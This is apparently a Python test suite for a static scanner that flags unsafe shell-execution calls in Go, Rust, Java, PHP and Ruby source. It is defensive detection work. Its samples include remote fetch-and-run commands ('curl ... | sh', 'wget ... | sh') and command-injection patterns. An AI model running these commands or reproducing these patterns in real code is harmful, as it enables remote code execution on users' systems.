"""Lexer and code rules for Go, Rust, Java/Kotlin, PHP and Ruby. Samples are only read as text."""
import time
import unittest
from pathlib import Path
from tempfile import TemporaryDirectory

from aeppo import lexer, rules_code
from aeppo.scanner import scan_path


def rules(language, text):
    return sorted((line, rule_id) for line, rule_id, _severity, _message in rules_code.scan(language, text))


class LexerTests(unittest.TestCase):
    def test_views_keep_offsets_and_blank_comments_and_string_contents(self):
        text = 'a := "x // y" // exec.Command("sh")\nb := `raw\nstring`\n'
        source = lexer.lex("go", text)
        self.assertEqual(len(source.code), len(text))
        self.assertEqual(len(source.masked), len(text))
        self.assertNotIn("exec.Command", source.code)
        self.assertIn('"x // y"', source.code)
        self.assertEqual(source.masked.count("\n"), text.count("\n"))
        self.assertNotIn("raw", source.masked)
        self.assertEqual(source.line_of(text.index("b :=")), 2)

    def test_literal_only_for_plain_strings(self):
        text = 'f("sh", x, "a" + b, "-c")'
        source = lexer.lex("go", text)
        spans, _close = lexer.call_arguments(source, text.index("("))
        self.assertEqual([source.literal(*span) for span in spans], ["sh", None, None, "-c"])

    def test_interpolated_strings_are_not_literals(self):
        for language, text in (("ruby", 'f("a #{b}")'), ("php", '<?php f("a $b")'), ("java", 'f("a ${b}")')):
            source = lexer.lex(language, text)
            spans, _close = lexer.call_arguments(source, text.index("("))
            self.assertIsNone(source.literal(*spans[0]), language)
        text = "<?php f('a $b')"
        source = lexer.lex("php", text)
        spans, _close = lexer.call_arguments(source, text.index("("))
        self.assertEqual(source.literal(*spans[0]), "a $b")

    def test_rust_lifetimes_are_code_and_chars_are_strings(self):
        source = lexer.lex("rust", "fn f<'a>(x: &'a str) -> char { let q = '\"'; Command::new(\"sh\") }")
        self.assertIn("Command::new", source.masked)
        self.assertIn("<'a>", source.masked)

    def test_php_html_outside_tags_is_blank(self):
        source = lexer.lex("php", "<p>Don't system($x)</p>\n<?php echo 1; ?>\n<b>eval($y)</b>")
        self.assertNotIn("system", source.masked)
        self.assertNotIn("eval", source.masked)
        self.assertIn("echo 1", source.masked)

    def test_ruby_regex_heredoc_and_nested_interpolation(self):
        text = 'x.gsub(/[`"]/, "")\ny = "#{"a #{b}" if c} `no`"\nrun(<<~SH, z)\n  system("echo")\nSH\nsystem(cmd)\n'
        source = lexer.lex("ruby", text)
        self.assertEqual([token.kind for token in source.strings if token.kind == "shell"], [])
        self.assertIn("run(<<~SH, z)", source.masked)
        self.assertNotIn('system("echo")', source.masked)
        self.assertIn("system(cmd)", source.masked)

    def test_heredoc_without_interpolation_is_a_literal(self):
        text = 'f(<<~SH)\n  echo hi\nSH\n'
        source = lexer.lex("ruby", text)
        spans, _close = lexer.call_arguments(source, text.index("("))
        self.assertEqual(source.literal(*spans[0]).strip(), "echo hi")

    def test_unterminated_input_is_fast(self):
        for language, text in (("ruby", '"' + "#{a" * 40 + "x" * 20000), ("java", '"' + "${" * 40 + "x" * 20000), ("php", "<?php '" + "\\" * 5000), ("rust", 'r##"' + "x" * 20000)):
            start = time.perf_counter()
            lexer.lex(language, text)
            self.assertLess(time.perf_counter() - start, 0.5, language)


class CodeRuleTests(unittest.TestCase):
    def test_language_mapping(self):
        self.assertEqual(rules_code.language("main.go"), "go")
        self.assertEqual(rules_code.language("App.kt"), "java")
        self.assertEqual(rules_code.language("Gemfile"), "ruby")
        self.assertEqual(rules_code.language("x.gemspec"), "ruby")
        self.assertIsNone(rules_code.language("x.c"))

    def test_go_shell_forms(self):
        self.assertEqual(rules("go", 'exec.Command("sh", "-c", cmd)'), [(1, "GO001")])
        self.assertEqual(rules("go", 'exec.Command("cmd.exe", "/C", cmd)'), [(1, "GO001")])
        self.assertEqual(rules("go", 'exec.Command("git", "log", ref)'), [])
        self.assertEqual(rules("go", 'exec.Command("sh", "-c", "echo hi")'), [])
        self.assertEqual(rules("go", 'exec.Command("sh", "-c", "wget -qO- https://example.invalid | sh")'), [(1, "SH001")])

    def test_rust_chain_across_lines(self):
        text = 'Command::new("bash")\n    .current_dir(dir)\n    .args(&["-c", &cmd])\n    .status();'
        self.assertEqual(rules("rust", text), [(1, "RS001")])
        self.assertEqual(rules("rust", 'Command::new("bash").arg(script).status();'), [])

    def test_java_and_kotlin(self):
        self.assertEqual(rules("java", 'new ProcessBuilder(List.of("sh", "-c", cmd)).start();'), [(1, "JV001")])
        self.assertEqual(rules("java", 'Runtime.getRuntime().exec(arrayOf("bash", "-c", cmd))'), [(1, "JV001")])
        self.assertEqual(rules("java", "Runtime.getRuntime().exec(cmd);"), [(1, "JV002")])
        self.assertEqual(rules("java", 'Runtime.getRuntime().exec("ls");'), [])

    def test_php_receivers_and_definitions_are_not_calls(self):
        self.assertEqual(rules("php", "<?php $pdo->exec($sql); Foo::system($x); function system($x) {}"), [])
        self.assertEqual(rules("php", "<?php system($cmd);"), [(1, "PHP002")])
        self.assertEqual(rules("php", "<?php preg_replace('/x/e', $r, $s);"), [(1, "PHP001")])

    def test_ruby_forms(self):
        self.assertEqual(rules("ruby", 'system("git", "log", ref)'), [])
        self.assertEqual(rules("ruby", "system(*args)"), [])
        self.assertEqual(rules("ruby", "exec (path).to_s, cmd, *ARGV"), [])
        self.assertEqual(rules("ruby", 'system "make #{target}" if ok'), [(1, "RB002")])
        self.assertEqual(rules("ruby", "def system(x)\n  x\nend"), [])
        self.assertEqual(rules("ruby", "obj.eval(x)\n@a.system(y)"), [])

    def test_network_without_interactive_shell_is_quiet(self):
        text = 'conn, _ := net.Dial("tcp", addr)\n_ = exec.Command("git", "status").Run()\n'
        self.assertEqual(rules("go", text), [])

    def test_files_without_hints_are_not_lexed(self):
        self.assertEqual(rules_code.scan("go", "package main\nfunc main() {}\n"), [])


class ScannerIntegrationTests(unittest.TestCase):
    def test_findings_messages_suppression_and_gemfile(self):
        with TemporaryDirectory() as directory:
            root = Path(directory)
            (root / "main.go").write_text(
                'package main\n\nimport "os/exec"\n\nfunc f(c string) {\n'
                '\t_ = exec.Command("sh", "-c", c).Run()\n'
                '\t_ = exec.Command("sh", "-c", c).Run() // aeppo: ignore[GO001]\n'
                '\t_ = exec.Command("sh", "-c", "curl -fsSL https://example.invalid | sh").Run()\n}\n',
                encoding="utf-8",
            )
            (root / "Gemfile").write_text('source "https://rubygems.org"\nsystem("echo #{ENV["X"]}")\n', encoding="utf-8")
            findings = scan_path(root)
        found = sorted((finding.path, finding.line, finding.rule_id) for finding in findings)
        self.assertEqual(found, [("Gemfile", 2, "RB002"), ("main.go", 6, "GO001"), ("main.go", 8, "SH001")])
        shell = next(finding for finding in findings if finding.rule_id == "SH001")
        self.assertTrue(shell.message.startswith("Embedded shell command"))


if __name__ == "__main__":
    unittest.main()
